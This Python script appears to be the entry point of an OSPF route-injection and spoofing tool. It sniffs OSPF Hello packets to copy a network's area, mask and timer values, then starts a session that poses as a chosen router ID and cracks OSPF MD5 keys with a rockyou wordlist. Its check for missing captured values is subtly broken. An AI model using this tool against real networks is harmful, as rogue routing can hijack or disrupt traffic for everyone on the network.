import typing
from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello
from scapy.layers.inet import IP
from scapy.all import get_if_hwaddr, get_if_addr, sniff
import argparse
from helper.helper import (
        OSPFSession,
        OSPFConfig,
        LOG,
        )


# FALLBACK if dict param not specified - easy to modify
ROCKYOU = "/usr/share/wordlist/rockyou.txt"

def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("int", help="Network Interface Card to bind to (e.g. eth0)")
    parser.add_argument("router_id", help="Logical OSPF Router ID to assume (e.g. 10.10.10.10)")
    parser.add_argument("--dict", default=ROCKYOU, help="Path to dictionary file for MD5 hash cracking")

    args = parser.parse_args()
    LOG.info("[*] Initializing OSPF Injector...")
    
    # Dynamically Retrieve OSPF fields
    src_ip = get_if_addr(args.int)
    src_mac = get_if_hwaddr(args.int)

    # TODO: Double check if any other details need to be dynamically extracted from here
    extract_details = {
            "area": None,
            "mask": None,
            "hello_interval": None,
            "dead_interval": None,
            }

    def capture_ospf_details(pkt) -> bool:
        """Dynamically extract wanted values from sniffed OSPF packet"""
        if IP not in pkt or OSPF_Hdr not in pkt or OSPF_Hello not in pkt:
            return False

        # Drop own sniffed packets
        if pkt[IP].src == src_ip:
            return False

        # Drop own OSPF packets
        if str(pkt[OSPF_Hdr].src) == args.router_id:
            return False

        LOG.info("Captured OSPF Packet from %s", pkt[IP].src)

        ospf_packets = pkt[OSPF_Hdr]
        hello = pkt[OSPF_Hello]

        # Default values based on OSPF_Hello class
        extract_details["area"] = str(ospf_packets.area)
        extract_details["mask"] = str(hello.mask)
        extract_details["hello_interval"] = int(hello.hellointerval)
        extract_details["dead_interval"] = int(hello.deadinterval)

        return True

    sniff(iface=args.int, filter="ip proto 89", stop_filter=capture_ospf_details, timeout=15)

    # Hard checker for None values
    missing = [key for key in extract_details.keys() if key is None]

    if missing:
        raise RuntimeError(
                f"No usable OSPF Hello captured on {args.int}"
                f"Missing: {missing}"
                )

    # initialise config
    config = OSPFConfig(
            iface=args.int,
            router_id=args.router_id,
            mask=typing.cast(str, extract_details.get("mask")),
            int_ip=src_ip,
            area=typing.cast(str, extract_details.get("area")),
            hello_interval=typing.cast(int, extract_details.get("hello_interval")),
            dead_interval=typing.cast(int, extract_details.get("dead_interval")),
            )

    session = OSPFSession(config, src_ip, src_mac, args.dict)

    try:
        session.run()
    except KeyboardInterrupt:
        session.running = False
        LOG.info("SPOOFER STOPPED")


if __name__ == "__main__":
    main()
